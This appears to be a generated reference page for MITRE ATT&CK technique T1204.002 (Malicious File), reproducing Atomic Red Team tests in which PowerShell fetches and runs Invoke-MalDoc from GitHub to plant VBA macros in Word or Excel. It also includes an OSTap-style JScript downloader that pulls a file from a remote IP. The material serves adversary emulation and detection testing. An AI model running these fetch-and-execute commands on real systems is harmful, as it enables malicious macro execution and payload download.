
# Malicious File

## Description

### MITRE Description

> An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1204/002

## Potential Commands

```
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"
echo var url = "https://128.30.52.100/TR/PNG/iso_8859-1.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
cscript //E:Jscript %TEMP%\OSTapGet.js
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"
```

## Commands Dataset

```
[{'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
             '`"cscript.exe C:\\Users\\Public\\art.jse`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
             '"#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe '
             '#{jse_path}`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe '
             '#{jse_path}`"`n"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'echo var url = "#{file_url}", fso = '
             "WScript.CreateObject('Scripting.FileSystemObject'), request, "
             "stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
             "request.open('GET', url, false); request.send(); if "
             '(request.status === 200) {stream = '
             "WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type "
             '= 1; stream.Write(request.responseBody); stream.Position = 0; '
             'stream.SaveToFile(filename, 1); stream.Close();} else '
             '{WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\n'
             'cscript //E:Jscript %TEMP%\\OSTapGet.js\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'echo var url = "https://128.30.52.100/TR/PNG/iso_8859-1.txt", '
             "fso = WScript.CreateObject('Scripting.FileSystemObject'), "
             'request, stream; request = '
             "WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
             "request.open('GET', url, false); request.send(); if "
             '(request.status === 200) {stream = '
             "WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type "
             '= 1; stream.Write(request.responseBody); stream.Position = 0; '
             'stream.SaveToFile(filename, 1); stream.Close();} else '
             '{WScript.Quit(1);}WScript.Quit(0); > #{script_file}\n'
             'cscript //E:Jscript #{script_file}\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T '
             '3`", vbNormalFocus)"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T '
             '3`", vbNormalFocus)"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = '
             'Shell(`"cmd.exe /c wscript.exe //E:jscript '
             'C:\\Users\\Public\\art.jse`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
             '"#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c '
             'wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c '
             'wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204.002/T1204.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - User Execution: Malicious Link': {'atomic_tests': [{'auto_generated_guid': '8bebc690-18c7-4549-bc98-210f7019efff',
                                                                              'dependencies': [{'description': 'Test '
                                                                                                               'Requires '
                                                                                                               'MS '
                                                                                                               'Office '
                                                                                                               'to '
                                                                                                               'be '
                                                                                                               'installed '
                                                                                                               'and '
                                                                                                               'have '
                                                                                                               'been '
                                                                                                               'run '
                                                                                                               'previously. '
                                                                                                               'Run '
                                                                                                               '-GetPrereqs '
                                                                                                               'to '
                                                                                                               'run '
                                                                                                               'msword '
                                                                                                               'and '
                                                                                                               'build '
                                                                                                               'dependant '
                                                                                                               'registry '
                                                                                                               'keys\n',
                                                                                                'get_prereq_command': '$msword '
                                                                                                                      '= '
                                                                                                                      'New-Object '
                                                                                                                      '-ComObject '
                                                                                                                      'word.application\n'
                                                                                                                      'Stop-Process '
                                                                                                                      '-Name '
                                                                                                                      'WINWORD\n',
                                                                                                'prereq_command': 'If '
                                                                                                                  '(Test-Path '
                                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '0 '
                                                                                                                  '} '
                                                                                                                  'else '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '1 '
                                                                                                                  '}\n'}],
                                                                              'dependency_executor_name': 'powershell',
                                                                              'description': 'This '
                                                                                             'Test '
                                                                                             'uses '
                                                                                             'a '
                                                                                             'VBA '
                                                                                             'macro '
                                                                                             'to '
                                                                                             'create '
                                                                                             'and '
                                                                                             'execute '
                                                                                             '#{jse_path} '
                                                                                             'with '
                                                                                             'cscript.exe. '
                                                                                             'Upon '
                                                                                             'execution, '
                                                                                             'the '
                                                                                             '.jse '
                                                                                             'file '
                                                                                             'launches '
                                                                                             'wscript.exe.\n'
                                                                                             'Execution '
                                                                                             'is '
                                                                                             'handled '
                                                                                             'by '
                                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                                             'to '
                                                                                             'load '
                                                                                             'and '
                                                                                             'execute '
                                                                                             'VBA '
                                                                                             'code '
                                                                                             'into '
                                                                                             'Excel '
                                                                                             'or '
                                                                                             'Word '
                                                                                             'documents.\n'
                                                                                             '\n'
                                                                                             'This '
                                                                                             'is '
                                                                                             'a '
                                                                                             'known '
                                                                                             'execution '
                                                                                             'chain '
                                                                                             'observed '
                                                                                             'by '
                                                                                             'the '
                                                                                             'OSTap '
                                                                                             'downloader '
                                                                                             'commonly '
                                                                                             'used '
                                                                                             'in '
                                                                                             'TrickBot '
                                                                                             'campaigns\n'
                                                                                             'References:\n'
                                                                                             '  '
                                                                                             'https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n',
                                                                              'executor': {'cleanup_command': 'if '
                                                                                                              '(Test-Path '
                                                                                                              '#{jse_path}) '
                                                                                                              '{ '
                                                                                                              'Remove-Item '
                                                                                                              '#{jse_path} '
                                                                                                              '}\n'
                                                                                                              'Remove-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                                              '-Name '
                                                                                                              "'AccessVBOM' "
                                                                                                              '-ErrorAction '
                                                                                                              'Ignore\n',
                                                                                           'command': 'IEX '
                                                                                                      '(iwr '
                                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                                      '$macrocode '
                                                                                                      '= '
                                                                                                      '"   '
                                                                                                      'Open '
                                                                                                      '`"#{jse_path}`" '
                                                                                                      'For '
                                                                                                      'Output '
                                                                                                      'As '
                                                                                                      '#1`n   '
                                                                                                      'Write '
                                                                                                      '#1, '
                                                                                                      '`"WScript.Quit`"`n   '
                                                                                                      'Close '
                                                                                                      '#1`n   '
                                                                                                      'Shell`$ '
                                                                                                      '`"cscript.exe '
                                                                                                      '#{jse_path}`"`n"\n'
                                                                                                      'Invoke-MalDoc '
                                                                                                      '$macrocode '
                                                                                                      '"#{ms_office_version}" '
                                                                                                      '"#{ms_product}"\n',
                                                                                           'name': 'powershell'},
                                                                              'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
                                                                                                               'description': 'Path '
                                                                                                                              'for '
                                                                                                                              'the '
                                                                                                                              'macro '
                                                                                                                              'to '
                                                                                                                              'write '
                                                                                                                              'out '
                                                                                                                              'the '
                                                                                                                              '"malicious" '
                                                                                                                              '.jse '
                                                                                                                              'file\n',
                                                                                                               'type': 'String'},
                                                                                                  'ms_office_version': {'default': '16.0',
                                                                                                                        'description': 'Microsoft '
                                                                                                                                       'Office '
                                                                                                                                       'version '
                                                                                                                                       'number '
                                                                                                                                       'found '
                                                                                                                                       'in '
                                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                                        'type': 'String'},
                                                                                                  'ms_product': {'default': 'Word',
                                                                                                                 'description': 'Maldoc '
                                                                                                                                'application '
                                                                                                                                'Word '
                                                                                                                                'or '
                                                                                                                                'Excel',
                                                                                                                 'type': 'String'}},
                                                                              'name': 'OSTap '
                                                                                      'Style '
                                                                                      'Macro '
                                                                                      'Execution',
                                                                              'supported_platforms': ['windows']},
                                                                             {'auto_generated_guid': '3f3af983-118a-4fa1-85d3-ba4daa739d80',
                                                                              'description': 'Uses '
                                                                                             'cscript '
                                                                                             '//E:jscript '
                                                                                             'to '
                                                                                             'download '
                                                                                             'a '
                                                                                             'file\n',
                                                                              'executor': {'cleanup_command': 'del '
                                                                                                              '#{script_file} '
                                                                                                              '/F '
                                                                                                              '/Q '
                                                                                                              '>nul '
                                                                                                              '2>&1\n',
                                                                                           'command': 'echo '
                                                                                                      'var '
                                                                                                      'url '
                                                                                                      '= '
                                                                                                      '"#{file_url}", '
                                                                                                      'fso '
                                                                                                      '= '
                                                                                                      "WScript.CreateObject('Scripting.FileSystemObject'), "
                                                                                                      'request, '
                                                                                                      'stream; '
                                                                                                      'request '
                                                                                                      '= '
                                                                                                      "WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
                                                                                                      "request.open('GET', "
                                                                                                      'url, '
                                                                                                      'false); '
                                                                                                      'request.send(); '
                                                                                                      'if '
                                                                                                      '(request.status '
                                                                                                      '=== '
                                                                                                      '200) '
                                                                                                      '{stream '
                                                                                                      '= '
                                                                                                      "WScript.CreateObject('ADODB.Stream'); "
                                                                                                      'stream.Open(); '
                                                                                                      'stream.Type '
                                                                                                      '= '
                                                                                                      '1; '
                                                                                                      'stream.Write(request.responseBody); '
                                                                                                      'stream.Position '
                                                                                                      '= '
                                                                                                      '0; '
                                                                                                      'stream.SaveToFile(filename, '
                                                                                                      '1); '
                                                                                                      'stream.Close();} '
                                                                                                      'else '
                                                                                                      '{WScript.Quit(1);}WScript.Quit(0); '
                                                                                                      '> '
                                                                                                      '#{script_file}\n'
                                                                                                      'cscript '
                                                                                                      '//E:Jscript '
                                                                                                      '#{script_file}\n',
                                                                                           'name': 'command_prompt'},
                                                                              'input_arguments': {'file_url': {'default': 'https://128.30.52.100/TR/PNG/iso_8859-1.txt',
                                                                                                               'description': 'URL '
                                                                                                                              'to '
                                                                                                                              'retrieve '
                                                                                                                              'file '
                                                                                                                              'from',
                                                                                                               'type': 'Url'},
                                                                                                  'script_file': {'default': '%TEMP%\\OSTapGet.js',
                                                                                                                  'description': 'File '
                                                                                                                                 'to '
                                                                                                                                 'execute '
                                                                                                                                 'jscript '
                                                                                                                                 'code '
                                                                                                                                 'from',
                                                                                                                  'type': 'Path'}},
                                                                              'name': 'OSTap '
                                                                                      'Payload '
                                                                                      'Download',
                                                                              'supported_platforms': ['windows']},
                                                                             {'auto_generated_guid': '0330a5d2-a45a-4272-a9ee-e364411c4b18',
                                                                              'dependencies': [{'description': 'Test '
                                                                                                               'Requires '
                                                                                                               'MS '
                                                                                                               'Office '
                                                                                                               'to '
                                                                                                               'be '
                                                                                                               'installed '
                                                                                                               'and '
                                                                                                               'have '
                                                                                                               'been '
                                                                                                               'run '
                                                                                                               'previously. '
                                                                                                               'Run '
                                                                                                               '-GetPrereqs '
                                                                                                               'to '
                                                                                                               'run '
                                                                                                               'msword '
                                                                                                               'and '
                                                                                                               'build '
                                                                                                               'dependant '
                                                                                                               'registry '
                                                                                                               'keys\n',
                                                                                                'get_prereq_command': '$msword '
                                                                                                                      '= '
                                                                                                                      'New-Object '
                                                                                                                      '-ComObject '
                                                                                                                      'word.application\n'
                                                                                                                      'Stop-Process '
                                                                                                                      '-Name '
                                                                                                                      'WINWORD\n',
                                                                                                'prereq_command': 'If '
                                                                                                                  '(Test-Path '
                                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '0 '
                                                                                                                  '} '
                                                                                                                  'else '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '1 '
                                                                                                                  '}\n'}],
                                                                              'dependency_executor_name': 'powershell',
                                                                              'description': 'This '
                                                                                             'Test '
                                                                                             'uses '
                                                                                             'a '
                                                                                             'VBA '
                                                                                             'macro '
                                                                                             'to '
                                                                                             'execute '
                                                                                             'cmd '
                                                                                             'with '
                                                                                             'flags '
                                                                                             'observed '
                                                                                             'in '
                                                                                             'recent '
                                                                                             'maldoc '
                                                                                             'and '
                                                                                             '2nd '
                                                                                             'stage '
                                                                                             'downloaders. '
                                                                                             'Upon '
                                                                                             'execution, '
                                                                                             'CMD '
                                                                                             'will '
                                                                                             'be '
                                                                                             'launched.\n'
                                                                                             'Execution '
                                                                                             'is '
                                                                                             'handled '
                                                                                             'by '
                                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                                             'to '
                                                                                             'load '
                                                                                             'and '
                                                                                             'execute '
                                                                                             'VBA '
                                                                                             'code '
                                                                                             'into '
                                                                                             'Excel '
                                                                                             'or '
                                                                                             'Word '
                                                                                             'documents.\n',
                                                                              'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                                              '-Name '
                                                                                                              "'AccessVBOM' "
                                                                                                              '-ErrorAction '
                                                                                                              'Ignore\n',
                                                                                           'command': 'IEX '
                                                                                                      '(iwr '
                                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                                      '$macrocode '
                                                                                                      '= '
                                                                                                      '"  '
                                                                                                      'a '
                                                                                                      '= '
                                                                                                      'Shell(`"cmd.exe '
                                                                                                      '/c '
                                                                                                      'choice '
                                                                                                      '/C '
                                                                                                      'Y '
                                                                                                      '/N '
                                                                                                      '/D '
                                                                                                      'Y '
                                                                                                      '/T '
                                                                                                      '3`", '
                                                                                                      'vbNormalFocus)"\n'
                                                                                                      'Invoke-MalDoc '
                                                                                                      '$macrocode '
                                                                                                      '"#{ms_office_version}" '
                                                                                                      '"#{ms_product}"\n',
                                                                                           'name': 'powershell'},
                                                                              'input_arguments': {'ms_office_version': {'default': '16.0',
                                                                                                                        'description': 'Microsoft '
                                                                                                                                       'Office '
                                                                                                                                       'version '
                                                                                                                                       'number '
                                                                                                                                       'found '
                                                                                                                                       'in '
                                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                                        'type': 'String'},
                                                                                                  'ms_product': {'default': 'Word',
                                                                                                                 'description': 'Maldoc '
                                                                                                                                'application '
                                                                                                                                'Word '
                                                                                                                                'or '
                                                                                                                                'Excel',
                                                                                                                 'type': 'String'}},
                                                                              'name': 'Maldoc '
                                                                                      'choice '
                                                                                      'flags '
                                                                                      'command '
                                                                                      'execution',
                                                                              'supported_platforms': ['windows']},
                                                                             {'auto_generated_guid': 'add560ef-20d6-4011-a937-2c340f930911',
                                                                              'dependencies': [{'description': 'Test '
                                                                                                               'Requires '
                                                                                                               'MS '
                                                                                                               'Office '
                                                                                                               'to '
                                                                                                               'be '
                                                                                                               'installed '
                                                                                                               'and '
                                                                                                               'have '
                                                                                                               'been '
                                                                                                               'run '
                                                                                                               'previously. '
                                                                                                               'Run '
                                                                                                               '-GetPrereqs '
                                                                                                               'to '
                                                                                                               'run '
                                                                                                               'msword '
                                                                                                               'and '
                                                                                                               'build '
                                                                                                               'dependant '
                                                                                                               'registry '
                                                                                                               'keys\n',
                                                                                                'get_prereq_command': '$msword '
                                                                                                                      '= '
                                                                                                                      'New-Object '
                                                                                                                      '-ComObject '
                                                                                                                      'word.application\n'
                                                                                                                      'Stop-Process '
                                                                                                                      '-Name '
                                                                                                                      'WINWORD\n',
                                                                                                'prereq_command': 'If '
                                                                                                                  '(Test-Path '
                                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '0 '
                                                                                                                  '} '
                                                                                                                  'else '
                                                                                                                  '{ '
                                                                                                                  'exit '
                                                                                                                  '1 '
                                                                                                                  '}\n'}],
                                                                              'dependency_executor_name': 'powershell',
                                                                              'description': 'Malicious '
                                                                                             'JavaScript '
                                                                                             'executing '
                                                                                             'CMD '
                                                                                             'which '
                                                                                             'spawns '
                                                                                             'wscript.exe '
                                                                                             '//e:jscript\n'
                                                                                             '\n'
                                                                                             'Execution '
                                                                                             'is '
                                                                                             'handled '
                                                                                             'by '
                                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                                             'to '
                                                                                             'load '
                                                                                             'and '
                                                                                             'execute '
                                                                                             'VBA '
                                                                                             'code '
                                                                                             'into '
                                                                                             'Excel '
                                                                                             'or '
                                                                                             'Word '
                                                                                             'documents.\n',
                                                                              'executor': {'cleanup_command': 'if '
                                                                                                              '(Test-Path '
                                                                                                              '#{jse_path}) '
                                                                                                              '{ '
                                                                                                              'Remove-Item '
                                                                                                              '#{jse_path} '
                                                                                                              '}\n'
                                                                                                              'Remove-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                                              '-Name '
                                                                                                              "'AccessVBOM' "
                                                                                                              '-ErrorAction '
                                                                                                              'Ignore\n',
                                                                                           'command': 'IEX '
                                                                                                      '(iwr '
                                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                                      '$macrocode '
                                                                                                      '= '
                                                                                                      '"   '
                                                                                                      'Open '
                                                                                                      '`"#{jse_path}`" '
                                                                                                      'For '
                                                                                                      'Output '
                                                                                                      'As '
                                                                                                      '#1`n   '
                                                                                                      'Write '
                                                                                                      '#1, '
                                                                                                      '`"WScript.Quit`"`n   '
                                                                                                      'Close '
                                                                                                      '#1`n   '
                                                                                                      'a '
                                                                                                      '= '
                                                                                                      'Shell(`"cmd.exe '
                                                                                                      '/c '
                                                                                                      'wscript.exe '
                                                                                                      '//E:jscript '
                                                                                                      '#{jse_path}`", '
                                                                                                      'vbNormalFocus)`n"\n'
                                                                                                      'Invoke-MalDoc '
                                                                                                      '$macrocode '
                                                                                                      '"#{ms_office_version}" '
                                                                                                      '"#{ms_product}"\n',
                                                                                           'name': 'powershell'},
                                                                              'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
                                                                                                               'description': 'jse '
                                                                                                                              'file '
                                                                                                                              'to '
                                                                                                                              'execute '
                                                                                                                              'with '
                                                                                                                              'wscript',
                                                                                                               'type': 'Path'},
                                                                                                  'ms_office_version': {'default': '16.0',
                                                                                                                        'description': 'Microsoft '
                                                                                                                                       'Office '
                                                                                                                                       'version '
                                                                                                                                       'number '
                                                                                                                                       'found '
                                                                                                                                       'in '
                                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                                        'type': 'String'},
                                                                                                  'ms_product': {'default': 'Word',
                                                                                                                 'description': 'Maldoc '
                                                                                                                                'application '
                                                                                                                                'Word '
                                                                                                                                'or '
                                                                                                                                'Excel',
                                                                                                                 'type': 'String'}},
                                                                              'name': 'OSTAP '
                                                                                      'JS '
                                                                                      'version',
                                                                              'supported_platforms': ['windows']}],
                                                            'attack_technique': 'T1204.002',
                                                            'display_name': 'User '
                                                                            'Execution: '
                                                                            'Malicious '
                                                                            'Link'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)

* [User Training](../mitigations/User-Training.md)
    

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [APT19](../actors/APT19.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [APT37](../actors/APT37.md)
    
* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [APT28](../actors/APT28.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [APT29](../actors/APT29.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [FIN7](../actors/FIN7.md)
    
* [FIN4](../actors/FIN4.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [Elderwood](../actors/Elderwood.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [TA459](../actors/TA459.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT32](../actors/APT32.md)
    
* [Rancor](../actors/Rancor.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [APT39](../actors/APT39.md)
    
* [The White Company](../actors/The-White-Company.md)
    
* [Silence](../actors/Silence.md)
    
* [TA505](../actors/TA505.md)
    
* [APT12](../actors/APT12.md)
    
* [admin@338](../actors/admin@338.md)
    
* [Machete](../actors/Machete.md)
    
* [APT-C-36](../actors/APT-C-36.md)
    
* [BlackTech](../actors/BlackTech.md)
    
* [Inception](../actors/Inception.md)
    
* [RTM](../actors/RTM.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
* [Mofang](../actors/Mofang.md)
    
* [Wizard Spider](../actors/Wizard-Spider.md)
    
* [Molerats](../actors/Molerats.md)
    
* [Sharpshooter](../actors/Sharpshooter.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Whitefly](../actors/Whitefly.md)
    
* [Naikon](../actors/Naikon.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
* [APT33](../actors/APT33.md)
    
* [Windshift](../actors/Windshift.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
